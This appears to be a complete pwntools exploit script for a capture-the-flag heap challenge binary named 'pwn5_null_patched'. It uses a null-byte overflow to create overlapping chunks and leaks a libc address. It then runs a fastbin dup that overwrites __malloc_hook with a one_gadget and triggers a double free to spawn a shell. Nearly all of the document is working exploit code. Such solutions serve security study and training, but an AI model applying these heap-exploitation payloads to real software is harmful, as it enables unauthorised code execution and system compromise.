from pwn import *
context.binary=exe=ELF("./pwn5_null_patched",checksec=False)
p=process(exe.path)

def create(idx,size,data):
    p.sendafter(b">\n",b"1")
    p.sendafter(b"Index:",idx)
    p.sendafter(b"Input size:",size)
    p.sendafter(b"Input data:",data)
def show(idx):
    p.sendafter(b">\n",b"2")
    p.sendafter(b"Index:",idx)
def edit(index,newsize,data):
    p.sendafter(b">\n",b"3")
    p.sendafter(b"Input index:",index)
    p.sendlineafter(b"Input newsize:",newsize)
    p.sendlineafter(b"Do you want to change data (y/n)?\n",b"y")
    p.sendafter(b"Input data:",data)
def delete(idx):
    p.sendafter(b">\n",b"4")
    p.sendafter(b"Input index:",idx)


#### stage1: ##################################################################
create(b"0",b"136",b"\x00")#CHUNK0 We use this chunk to overflow chunk1 metadata
create(b"1",b"520",b"\x00"*8)#CHUNK1 we need this chunk to be size 3 digit in hex
create(b"2",b"136",b"\x00"*8)#CHUNK2 this chunk is for overlapping
create(b"3",b"18",b"\x00")#JUNK CHUNK avoid chunk2 get consolidation with the top chunk when we free it 
### stage2#########################################################
delete(b"1")
edit(b"0",p64(136),p8(0)*136)
create(b"1",b"248",b"\x00"*8)#CHUNK1a
create(b"4",b"248",b"\x00"*8)#CHUNK1b
delete(b"1")
delete(b"2")
###stage3 #############################################################
create(b"1",b"248",b"\x00"*8)#CHUNK1a
show(b"4")
p.recvuntil(b"Data = ")
leak=int.from_bytes(p.recv(6),"little")
libc=leak-0x39bb78
log.info("leak: "+hex(leak))
log.info("libc base: "+hex(libc))
malloc_hook=libc+0x39bb10
one_gadget=libc+0x3f42a


### stag 4:fastbin dup############################################################
create(b"5",b"104",b"BATMAN") # this is chunk1b
delete(b"5")# chunk1b go in fast bin
edit(b"4",p64(104),p64(malloc_hook-35))# store[4] is still poin to chunk1b
create(b"5",b"104",b"B"*19+p64(one_gadget))# this chunk do nothing it will just get everything out of the bin
create(b"6",b"104",b"B"*19+p64(one_gadget))

## trigger abort by the same chunk at index 4 and 6
delete(b"4")
delete(b"6")

p.interactive()